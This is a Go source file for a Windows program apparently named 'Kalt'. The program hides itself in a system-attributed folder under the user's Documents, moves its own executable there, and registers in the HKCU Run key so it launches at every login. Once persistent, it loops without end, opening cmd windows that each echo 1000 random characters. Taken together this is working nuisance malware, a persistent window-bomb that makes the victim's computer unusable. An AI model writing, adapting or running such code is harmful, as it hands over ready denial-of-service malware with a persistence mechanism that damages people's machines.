package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

const (
	startupArg string = "-gfk"
	rngStuff   string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	startup    string = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	execName   string = "Kalt"

	DEBUGGING             bool = false
	DEBUGGING_MAX_WINDOWS int  = 15
)

func main() {
	if !getFolderState() || !getStartupState() {
		folder := getFolderPath()
		err := os.MkdirAll(folder, os.ModePerm)
		if err != nil {
			awaitInput("error 4")
			return
		}

		cmd := exec.Command("attrib", "+H", "+S", folder)
		err = cmd.Run()
		if err != nil {
			awaitInput("error 5")
			return
		}

		oldPath, err := os.Executable()
		if err != nil {
			awaitInput("error 6")
			return
		}

		newPath := filepath.Join(folder, filepath.Base(oldPath))
		err = os.Rename(oldPath, newPath)
		if err != nil {
			awaitInput("error 7")
			return
		}

		if !DEBUGGING {
			handle, err := registry.OpenKey(
				registry.CURRENT_USER,
				startup, registry.ALL_ACCESS,
			)

			if err != nil {
				awaitInput("error 8")
				return
			}

			defer handle.Close()

			err = handle.SetStringValue(execName, fmt.Sprintf("\"%s\" %s", os.Args[0], startupArg))
			if err != nil {
				awaitInput("error 9")
				return
			}
		}

		cmd = exec.Command(newPath, startupArg)
		err = cmd.Start()
		if err != nil {
			awaitInput("error 10")
			return
		}

		return
	}

	if len(os.Args) < 2 || os.Args[1] != startupArg {
		return
	}

	if DEBUGGING {
		fmt.Println(os.Args[0])
		fmt.Println(os.Args[1])
		fmt.Println(os.Args[1] == startupArg)
	}

	windows := 0
	for {
		spawnWindow()

		windows++
		if DEBUGGING && windows >= DEBUGGING_MAX_WINDOWS {
			break
		}
	}
}

func getString(length int) string {
	if DEBUGGING {
		return "debugging " + fmt.Sprint(length)
	}

	str := make([]byte, length)
	for i := range str {
		str[i] = rngStuff[rand.Intn(len(rngStuff))]
	}

	return string(str)
}

func spawnWindow() {
	cmd := exec.Command("cmd", "/C", "start", "echo", getString(1000))
	cmd.Start()
}

func awaitInput(message string) {
	fmt.Println(message)
	fmt.Scanln()
}

func getFolderPath() string {
	return filepath.Join(os.Getenv("USERPROFILE"), "Documents", execName)
}

func getFolderState() bool {
	path, err := os.Executable()
	if err != nil {
		fmt.Println("error 1")
		return false
	}

	return filepath.Dir(path) == getFolderPath()
}

func getStartupState() bool {
	if DEBUGGING {
		return true
	}

	handle, err := registry.OpenKey(
		registry.CURRENT_USER,
		startup, registry.ALL_ACCESS,
	)

	if err != nil {
		fmt.Println("error 2")
		return false
	}

	defer handle.Close()

	val, _, err := handle.GetStringValue(execName)
	if err != nil {
		fmt.Println("error 3")
		return false
	}

	return val == fmt.Sprintf("\"%s\" %s", os.Args[0], startupArg)
}
